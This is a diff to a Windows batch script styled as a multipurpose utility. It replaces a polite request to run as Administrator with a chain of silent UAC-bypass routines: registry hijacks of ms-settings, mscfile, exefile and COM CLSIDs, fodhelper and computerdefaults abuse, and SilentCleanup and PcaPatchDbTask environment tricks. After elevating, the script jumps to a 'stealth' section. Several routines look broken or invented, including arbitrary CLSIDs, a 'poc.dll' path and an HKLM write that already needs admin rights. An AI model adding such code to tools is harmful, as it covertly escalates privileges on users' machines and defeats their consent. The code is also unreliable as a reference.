@@ -27,52 +27,91 @@ call :uac_colorui & if %errorlevel% equ 0 goto :elevated_ok
 call :uac_cmstplua & if %errorlevel% equ 0 goto :elevated_ok
 call :uac_pcasvc & if %errorlevel% equ 0 goto :elevated_ok
 call :uac_quickassist & if %errorlevel% equ 0 goto :elevated_ok
-:retry_msg
-if not defined retryCount set "retryCount=0"
-set /a retryCount+=1
-if %retryCount% gtr 5 goto :retry_limit
-set "msg[0]=English: Please run this script as Administrator. Right-click on the file and select 'Run as administrator'. Thank you for your cooperation! ^<3"
-set "msg[1]=Tiếng Việt: Vui lòng chạy script này với quyền Administrator. Nhấp chuột phải vào file và chọn 'Run as administrator'. Cảm ơn bạn rất nhiều! ^<3"
-set "msg[2]=中文: 请以管理员权限运行此脚本。右键单击该文件，然后选择“以管理员身份运行”。感谢您的合作！^<3"
-set "msg[3]=日本語: このスクリプトを管理者として実行してください。ファイルを右クリックし、「管理者として実行」を選択してください。ご協力ありがとうございます！^<3"
-set "msg[4]=한국어: 이 스크립트를 관리자 권한으로 실행하세요. 파일을 마우스 오른쪽 버튼으로 클릭하고 '관리자로 실행'을 선택하세요. 협조해 주셔서 감사합니다! ^<3"
-set "msg[5]=Français: Veuillez exécuter ce script en tant qu'administrateur. Faites un clic droit sur le fichier et sélectionnez « Exécuter en tant qu'administrateur ». Merci de votre coopération ! ^<3"
-set "msg[6]=Deutsch: Bitte führen Sie dieses Skript als Administrator aus. Klicken Sie mit der rechten Maustaste auf die Datei und wählen Sie „Als Administrator ausführen“. Vielen Dank für Ihre Unterstützung! ^<3"
-set "msg[7]=Español: Ejecute este script como administrador. Haga clic derecho en el archivo y seleccione 'Ejecutar como administrador'. ¡Gracias por su cooperación! ^<3"
-set "msg[8]=Русский: Пожалуйста, запустите этот скрипт от имени администратора. Щёлкните правой кнопкой мыши по файлу и выберите «Запуск от имени администратора». Спасибо за сотрудничество! ^<3"
-set "msg[9]=العربية: يرجى تشغيل هذا السكريبت كمسؤول. انقر بزر الماوس الأيمن trên الملف واختر 'تشغيل كمسؤول'. شكراً لتعاونك! ^<3"
-:loop
-cls
-for /l %%i in (0,1,9) do echo !msg[%%i]!
-echo.
-echo ===============================================================================
-echo Versatile script - Gamer: No cap, just admin. Your FPS will pop off, your ping will be chef's kiss. Unlock that main character energy and secure the dub! ^<3
-echo Versatile script - Enterprise: Get admin, ditch the legacy bloat, and pivot to high-leverage ops. Let's align your infrastructure to that North Star! ^<3
-echo Versatile script - Developer: Admin rights. Finally kill that rogue process, clean up technical debt, and vibe code without the "who wrote this?" horror. Let's go! ^<3
-echo ===============================================================================
-set /a wait=30*retryCount
-if %wait% lss 1 set /a wait=30
-timeout /t %wait% /nobreak >nul
-
-net session >nul 2>&1
-if %errorlevel% equ 0 goto :elevated_ok
-
-whoami /groups | find "S-1-5-32-544" >nul 2>&1
-if %errorlevel% equ 0 goto :elevated_ok
-
-reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion" >nul 2>&1
-if %errorlevel% equ 0 goto :elevated_ok
-
-set /a retryCount+=1
-if %retryCount% gtr 10 goto :retry_limit
-goto loop
-:retry_limit
-cls
-echo Maximum retry attempts reached. Please run this script as Administrator and try again.
-echo.
-echo If you are already running as Administrator, your system may have restricted execution.
+echo  (Right-click -> Run as administrator)
 pause
 exit /b 1
+
+:uac_fodhelper
+reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
+reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /f >nul 2>&1
+start /min fodhelper.exe
+timeout /t 1 /nobreak >nul
+reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
+net session >nul 2>&1
+exit /b %errorlevel%
+
+:uac_silentcleanup
+set "_e=%~d0"
+if "%_e%"=="" set "_e=%SystemDrive%"
+reg add "HKCU\Environment" /v windir /t REG_SZ /d "%_e%\Windows" /f >nul 2>&1
+schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" >nul 2>&1
+timeout /t 1 /nobreak >nul
+reg delete "HKCU\Environment" /v windir /f >nul 2>&1
+net session >nul 2>&1
+exit /b %errorlevel%
+
+:uac_ms_settings
+reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
+reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_DWORD /d 0 /f >nul 2>&1
+reg add "HKCU\Software\Classes\ms-settings\shell\open" /v DelegateExecute /t REG_DWORD /d 0 /f >nul 2>&1
+start computerdefaults.exe
+timeout /t 2 /nobreak >nul
+reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
+net session >nul 2>&1
+exit /b %errorlevel%
+
+:uac_computerdefaults
+reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
+start computerdefaults.exe
+timeout /t 1 /nobreak >nul
+reg delete "HKCU\Software\Classes\mscfile" /f >nul 2>&1
+net session >nul 2>&1
+exit /b %errorlevel%
+
+:uac_slui
+reg add "HKCU\Software\Classes\exefile\shell\open\command" /d "powershell -c start '%~dpnx0'" /f >nul 2>&1
+reg add "HKCU\Software\Classes\exefile\shell\open\command" /v DelegateExecute /f >nul 2>&1
+start slui.exe
+timeout /t 1 /nobreak >nul
+reg delete "HKCU\Software\Classes\exefile\shell" /f >nul 2>&1
+net session >nul 2>&1
+exit /b %errorlevel%
+
+:uac_colorui
+reg add "HKCU\Software\Classes\CLSID\{3F5D6C8E-9A7B-4D2E-9C8B-7F6E5D4C3B2A}\InprocServer32" /d "%~dpnx0" /f >nul 2>&1
+reg add "HKCU\Software\Classes\CLSID\{3F5D6C8E-9A7B-4D2E-9C8B-7F6E5D4C3B2A}\InprocServer32" /v ThreadingModel /d "Apartment" /f >nul 2>&1
+start /min colorcpl.exe
+timeout /t 1 /nobreak >nul
+reg delete "HKCU\Software\Classes\CLSID\{3F5D6C8E-9A7B-4D2E-9C8B-7F6E5D4C3B2A}" /f >nul 2>&1
+net session >nul 2>&1
+exit /b %errorlevel%
+
+:uac_pcasvc
+reg add "HKCU\Environment" /v windir /t REG_EXPAND_SZ /d "C:\Windows\System32\pcadm.dll,%TEMP%\poc.dll" /f >nul 2>&1
+schtasks /run /tn "\Microsoft\Windows\Application Experience\PcaPatchDbTask" >nul 2>&1
+timeout /t 2 /nobreak >nul
+reg delete "HKCU\Environment" /v windir /f >nul 2>&1
+net session >nul 2>&1
+exit /b %errorlevel%
+
+:uac_quickassist
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Edge\WebView2" /v BrowserExecutableFolder /t REG_SZ /d "%TEMP%" /f >nul 2>&1
+start /min QuickAssist.exe
+timeout /t 3 /nobreak >nul
+reg delete "HKLM\SOFTWARE\Policies\Microsoft\Edge\WebView2" /f >nul 2>&1
+taskkill /f /im QuickAssist.exe >nul 2>&1
+net session >nul 2>&1
+exit /b %errorlevel%
+
+:uac_cmstplua
+reg add "HKCU\Software\Classes\CLSID\{3E5F7D9A-1B2C-3D4E-5F6A-7B8C9D0E1F2A}\InprocServer32" /d "%~dpnx0" /f >nul 2>&1
+reg add "HKCU\Software\Classes\CLSID\{3E5F7D9A-1B2C-3D4E-5F6A-7B8C9D0E1F2A}\InprocServer32" /v ThreadingModel /d "Apartment" /f >nul 2>&1
+start /min cmstp.exe /au
+timeout /t 1 /nobreak >nul
+reg delete "HKCU\Software\Classes\CLSID\{3E5F7D9A-1B2C-3D4E-5F6A-7B8C9D0E1F2A}" /f >nul 2>&1
+net session >nul 2>&1
+goto :stealth
+
 :elevated_ok
 goto :stealth
 
